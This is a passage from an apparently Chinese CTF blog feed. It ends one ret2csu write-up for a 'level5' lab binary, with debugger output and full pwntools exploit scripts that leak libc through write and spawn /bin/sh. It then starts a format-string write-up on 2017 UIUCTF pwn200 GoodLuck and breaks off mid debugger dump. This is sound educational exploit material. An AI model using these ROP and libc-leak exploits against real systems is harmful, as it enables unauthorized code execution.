—▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">12:0090│      0x7fffffffdf58 —▸ 0x4005b4 (main+45) ◂— mov    eax, 0</span><br><span class="line">13:0098│      0x7fffffffdf60 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— &#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span><br><span class="line">14:00a0│      0x7fffffffdf68 ◂— 0x100000000</span><br><span class="line">15:00a8│      0x7fffffffdf70 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">16:00b0│      0x7fffffffdf78 —▸ 0x7ffff7a03bf7 (__libc_start_main+231) ◂— mov    edi, eax</span><br><span class="line">17:00b8│      0x7fffffffdf80 ◂— 0x2000000000</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出动态调出来的栈偏移与IDA中的0x80是相同的。此外，在IDA中可以发现并没有system函数，也没有/bin/sh字符串，所以只能用libc泄露函数地址来进行利用。这里选择用write函数来利用，打印出write_got函数的地址，再去寻找相对应的libc，当然也可以选用__libc_start_main来利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">/home/yutao/Desktop/hitcon-level5/level5:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><p>寻找write函数在内存中的真实地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line"><span class="comment">#                                        rbx    rbp        call:r12     r13-&gt;rdx     r14-&gt;rsi     r15-&gt;edi        </span></span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure><p>发生溢出后，覆盖返回地址，之后push各种东西，再之后覆盖返回地址为mov_addr的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx  //rbx-&gt;0</span><br><span class="line">.text:000000000040061B                 pop     rbp  //rbp-&gt;1</span><br><span class="line">.text:000000000040061C                 pop     r12  //r12-&gt;write_got函数地址</span><br><span class="line">.text:000000000040061E                 pop     r13  //r13-&gt;8</span><br><span class="line">.text:0000000000400620                 pop     r14  //r14-&gt;write_got函数地址</span><br><span class="line">.text:0000000000400622                 pop     r15  //r15-&gt;1</span><br><span class="line">.text:0000000000400624                 retn         //覆盖为mov_addr</span><br></pre></td></tr></table></figure><p>wiki上的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment">#获取write函数的got地址</span></span><br><span class="line">read_got = level5.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#获取read函数的got地址</span></span><br><span class="line">main_addr = level5.symbols[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#获取main函数的函数地址</span></span><br><span class="line">bss_base = level5.bss()<span class="comment">#获取bss段地址</span></span><br><span class="line">csu_front_gadget = <span class="number">0x00000000004005F0</span> </span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget</span></span><br><span class="line">csu_behind_gadget = <span class="number">0x0000000000400606</span></span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义csu函数，方便每一次构造payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">fill, rbx, rbp, r12, r13, r14, r15, main</span>):</span></span><br><span class="line">  <span class="comment">#fill为填充sp指针偏移造成8字节空缺</span></span><br><span class="line">  <span class="comment">#rbx, rbp, r12, r13, r14, r15皆为pop参数</span></span><br><span class="line">  <span class="comment">#main为main函数地址</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">136</span> <span class="comment">#0x80+8个字节填满栈空间至ret返回指令</span></span><br><span class="line">    payload += p64(csu_behind_gadget) </span><br><span class="line">    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_gadget)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span>      <span class="comment">#0x38个字节填充平衡堆栈造成的空缺</span></span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.send(payload)    <span class="comment">#发送payload</span></span><br><span class="line">    sleep(<span class="number">1</span>)<span class="comment">#暂停等待接收</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#write函数布局打印write函数地址并返回main函数</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))    <span class="comment">#接收write函数地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)<span class="comment">#LibcSearcher查找libc版本</span></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>) <span class="comment">#计算该版本libc基地址</span></span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>) <span class="comment">#查找该版本libc execve函数地址</span></span><br><span class="line">log.success(<span class="string">&#x27;execve_addr &#x27;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#调用bss段中的execve(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2csu&quot;&gt;&lt;a href=&quot;#ret2csu&quot; class=&quot;headerlink&quot; title=&quot;ret2csu&quot;&gt;&lt;/a&gt;ret2csu&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞举例</title>
    <link href="http://example.com/2021/02/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/"/>
    <id>http://example.com/2021/02/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/</id>
    <published>2021-02-06T10:50:57.000Z</published>
    <updated>2021-06-01T16:19:36.305Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="格式化字符串漏洞例子"><a href="#格式化字符串漏洞例子" class="headerlink" title="格式化字符串漏洞例子"></a>格式化字符串漏洞例子</h1><h2 id="64位程序格式化字符串漏洞"><a href="#64位程序格式化字符串漏洞" class="headerlink" title="64位程序格式化字符串漏洞"></a>64位程序格式化字符串漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这里用的是2017年的UIUCTF中的<strong>pwn200GoodLuck</strong>为例来介绍。</p><p>因为只有本地，所以在本地放了flag.txt文件</p><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a></p><p>首先checksec下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hacker@ubuntu:~/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck$ checksec goodluck</span><br><span class="line">[*] <span class="string">&#x27;/home/hacker/Desktop/2017-UIUCTF-pwn200-GoodLuck/goodluck&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>开了NX和部分RELRO。</p><p>漏洞很显然，就在printf那里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *format; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _IO_FILE *fp; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">21</span>; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s the flag&quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = <span class="number">0LL</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ms&quot;</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">21</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b <span class="built_in">printf</span> </span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x400640</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hacker/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck </span><br><span class="line">/bin/bash: /home/hacker/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck: Permission denied</span><br><span class="line">/bin/bash: line <span class="number">0</span>: exec: /home/hacker/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck: cannot execute: Permission denied</span><br><span class="line">During startup program exited with code <span class="number">126.</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hacker/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck </span><br><span class="line">what<span class="number">&#x27;</span>s the flag</span><br><span class="line"><span class="number">12345678</span></span><br><span class="line">You answered:</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: <span class="number">0x0</span> </span><br><span class="line">RBX: <span class="number">0x0</span> </span><br><span class="line">RCX: <span class="number">0x7ffff7af2224</span> (&lt;__GI___libc_write+<span class="number">20</span>&gt;:cmp    rax,<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">RDX: <span class="number">0x7ffff7dcf8c0</span> --&gt; <span class="number">0x0</span> </span><br><span class="line">RSI: <span class="number">0x602490</span> (<span class="string">&quot;You answered:\ng\n111111&#125;\n&quot;</span>)</span><br><span class="line">RDI: <span class="number">0x602cb0</span> (<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line">RBP: <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x400900</span> (&lt;__libc_csu_init&gt;:push   r15)</span><br><span class="line">RSP: <span class="number">0x7fffffffdef8</span> --&gt; <span class="number">0x400890</span> (&lt;main+<span class="number">234</span>&gt;:mov    edi,<span class="number">0x4009b8</span>)</span><br><span class="line">RIP: <span class="number">0x7ffff7a46f70</span> (&lt;__printf&gt;:sub    rsp,<span class="number">0xd8</span>)</span><br><span class="line">R8 : <span class="number">0x7ffff7fdc500</span> (<span class="number">0x00007ffff7fdc500</span>)</span><br><span class="line">R9 : <span class="number">0x7ffff7b50a60</span> (&lt;__memcpy_ssse3+<span class="number">9168</span>&gt;:mov    rcx,QWORD PTR [rsi<span class="number">-0xd</span>])</span><br><span class="line">R10: <span class="number">0x3</span> </span><br><span class="line">R11: <span class="number">0x7ffff7a46f70</span> (&lt;__printf&gt;:sub    rsp,<span class="number">0xd8</span>)</span><br><span class="line">R12: <span class="number">0x4006b0</span> (&lt;_start&gt;:<span class="keyword">xor</span>    ebp,ebp)</span><br><span class="line">R13: <span class="number">0x7fffffffe020</span> --&gt; <span class="number">0x1</span> </span><br><span class="line">R14: <span class="number">0x0</span> </span><br><span class="line">R15: <span class="number">0x0</span></span><br><span class="line">EFLAGS: <span class="number">0x202</span> (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x7ffff7a46f5c</span> &lt;__fprintf+<span class="number">172</span>&gt;:call   <span class="number">0x7ffff7b16b10</span> &lt;__stack_chk_fail&gt;</span><br><span class="line">   <span class="number">0x7ffff7a46f61</span>:nop    WORD PTR cs:[rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x7ffff7a46f6b</span>:nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">=&gt; <span class="number">0x7ffff7a46f70</span> &lt;__printf&gt;:sub    rsp,<span class="number">0xd8</span></span><br><span class="line">   <span class="number">0x7ffff7a46f77</span> &lt;__printf+<span class="number">7</span>&gt;:test   al,al</span><br><span class="line">   <span class="number">0x7ffff7a46f79</span> &lt;__printf+<span class="number">9</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x28</span>],rsi</span><br><span class="line">   <span class="number">0x7ffff7a46f7e</span> &lt;__printf+<span class="number">14</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x30</span>],rdx</span><br><span class="line">   <span class="number">0x7ffff7a46f83</span> &lt;__printf+<span class="number">19</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x38</span>],rcx</span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0x7fffffffdef8</span> --&gt; <span class="number">0x400890</span> (&lt;main+<span class="number">234</span>&gt;:mov    edi,<span class="number">0x4009b8</span>)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0x7fffffffdf00</span> --&gt; <span class="number">0x31000001</span> </span><br><span class="line"><span class="number">0016</span>| <span class="number">0x7fffffffdf08</span> --&gt; <span class="number">0x602cb0</span> (<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0x7fffffffdf10</span> --&gt; <span class="number">0x602260</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0032</span>| <span class="number">0x7fffffffdf18</span> --&gt; <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;flag&#123;&quot;</span>, <span class="string">&#x27;1&#x27;</span> &lt;repeats <span class="number">17</span> times&gt;)</span><br><span class="line"><span class="number">0040</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;flag&#123;&quot;</span>, <span class="string">&#x27;1&#x27;</span> &lt;repeats <span class="number">17</span> times&gt;)</span><br><span class="line"><span class="number">0048</span>| <span class="number">0x7fffffffdf28</span> (<span class="string">&#x27;1&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;)</span><br><span class="line"><span class="number">0056</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x313131313131</span> (<span class="string">&#x27;111111&#x27;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, __printf (format=<span class="number">0x602cb0</span> <span class="string">&quot;12345678&quot;</span>) at <span class="built_in">printf</span>.c:<span class="number">28</span></span><br><span class="line"><span class="number">28</span><span class="built_in">printf</span>.c: No such file <span class="keyword">or</span> directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x7ffff7af2224</span> (write+<span class="number">20</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line"> RDX  <span class="number">0x7ffff7dcf8c0</span> (_IO_stdfile_1_lock) ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x602cb0</span> ◂— <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"> RSI  <span class="number">0x602490</span> ◂— <span class="string">&#x27;You answered:\ng\n111111&#125;\n&#x27;</span></span><br><span class="line"> R8   <span class="number">0x7ffff7fdc500</span> ◂— <span class="number">0x7ffff7fdc500</span></span><br><span class="line"> R9   <span class="number">0x7ffff7b50a60</span> (__memcpy_ssse3+<span class="number">9168</span>) ◂— mov    rcx, qword ptr [rsi - <span class="number">0xd</span>]</span><br><span class="line"> R10  <span class="number">0x3</span></span><br><span class="line"> R11  <span class="number">0x7ffff7a46f70</span> (<span class="built_in">printf</span>) ◂— sub    rsp, <span class="number">0xd8</span></span><br><span class="line"> R12  <span class="number">0x4006b0</span> (_start) ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffe020</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdf40</span> —▸ <span class="number">0x400900</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  <span class="number">0x7fffffffdef8</span> —▸ <span class="number">0x400890</span> (main+<span class="number">234</span>) ◂— mov    edi, <span class="number">0x4009b8</span></span><br><span class="line"> RIP  <span class="number">0x7ffff7a46f70</span> (<span class="built_in">printf</span>) ◂— sub    rsp, <span class="number">0xd8</span></span><br><span class="line">───────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff7a46f70</span> &lt;<span class="built_in">printf</span>&gt;        sub    rsp, <span class="number">0xd8</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7a46f79</span> &lt;<span class="built_in">printf</span>+<span class="number">9</span>&gt;      mov    qword ptr [rsp + <span class="number">0x28</span>], rsi</span><br><span class="line">   <span class="number">0x7ffff7a46f7e</span> &lt;<span class="built_in">printf</span>+<span class="number">14</span>&gt;     mov    qword ptr [rsp + <span class="number">0x30</span>], rdx</span><br><span class="line">   <span class="number">0x7ffff7a46f83</span> &lt;<span class="built_in">printf</span>+<span class="number">19</span>&gt;     mov    qword ptr [rsp + <span class="number">0x38</span>], rcx</span><br><span class="line">   <span class="number">0x7ffff7a46f88</span> &lt;<span class="built_in">printf</span>+<span class="number">24</span>&gt;     mov    qword ptr [rsp + <span class="number">0x40</span>], r8</span><br><span class="line">   <span class="number">0x7ffff7a46f8d</span> &lt;<span class="built_in">printf</span>+<span class="number">29</span>&gt;     mov    qword ptr [rsp + <span class="number">0x48</span>], r9</span><br><span class="line">   <span class="number">0x7ffff7a46f92</span> &lt;<span class="built_in">printf</span>+<span class="number">34</span>&gt;     je     <span class="built_in">printf</span>+<span class="number">91</span> &lt;<span class="built_in">printf</span>+<span class="number">91</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7a46fcb</span> &lt;<span class="built_in">printf</span>+<span class="number">91</span>&gt;     mov    rax, qword ptr fs:[<span 